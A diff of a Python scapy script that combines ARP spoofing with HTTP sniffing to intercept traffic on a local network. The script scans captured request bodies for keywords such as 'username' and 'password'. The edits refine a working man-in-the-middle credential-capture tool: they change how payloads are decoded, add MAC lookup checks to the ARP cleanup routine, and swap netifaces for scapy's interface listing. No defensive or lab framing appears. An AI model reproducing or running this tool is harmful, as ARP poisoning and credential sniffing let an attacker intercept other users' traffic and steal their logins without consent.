@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import argparse, time, threading, sys, netifaces
+import argparse, time, threading
 import scapy.all as scapy
 from scapy.layers import http
 
@@ -13,7 +13,6 @@ def ecouteReseau():
         scapy.sniff(iface=args.iface, filter=args.filter, count=args.count, prn=analysePaquet, store=args.save)
     else:
         scapy.sniff(iface=args.iface, filter=args.filter, prn=analysePaquet, store=args.save)
-
 
 def analysePaquet(packet):
     if packet.haslayer(http.HTTPRequest):
@@ -29,15 +28,11 @@ keywords_to_search = ('username', 'uname', 'user', 'login', 'password', 'pass', 
 
 def extractIds(packet):
     if packet[http.HTTPRequest].haslayer(scapy.Raw):
-        body = packet[http.HTTPRequest].getlayer(scapy.Raw).decode('utf-8')
+        body = bytes(packet[scapy.TCP].payload).decode('UTF8', 'replace')
         for keyword in keywords_to_search:
             if keyword in body:
                 print(f"Keyword '{keyword}' found in the request body.")
 
-    params = packet[http.HTTPRequest].http_request
-    for keyword in keywords_to_search:
-        if keyword in params:
-            print(f"Keyword '{keyword}' found in the request parameters.")
     
 def arpSpoofing(pdst, psrc):
     packet = scapy.ARP(op=2, pdst=pdst, hwdst=getMac(pdst), psrc=psrc)
@@ -56,13 +51,18 @@ def getMac(ip):
     return answered_list[0][1].hwsrc
 
 def cleanSpoof(pdst, psrc):
-    packet = scapy.ARP(op=2, pdst=pdst, psrc=psrc, hwdst=getMac(pdst), hwsrc=getMac(psrc))
+    hwdst = getMac(pdst)
+    hwsrc = getMac(psrc)
+    if not hwdst or not hwsrc:
+        return False
+    packet = scapy.ARP(op=2, pdst=pdst, psrc=psrc, hwdst=hwdst, hwsrc=hwsrc)
     scapy.send(packet, verbose=args.verbose)
     if args.verbose:
         print(f"[*] Packets sent {packet_sent}")
+    return True
 
 def list_interfaces():
-    interfaces = netifaces.interfaces()
+    interfaces = scapy.get_if_list()
     print("List of available network interfaces:")
     for interface in interfaces:
         print(f"- {interface}")
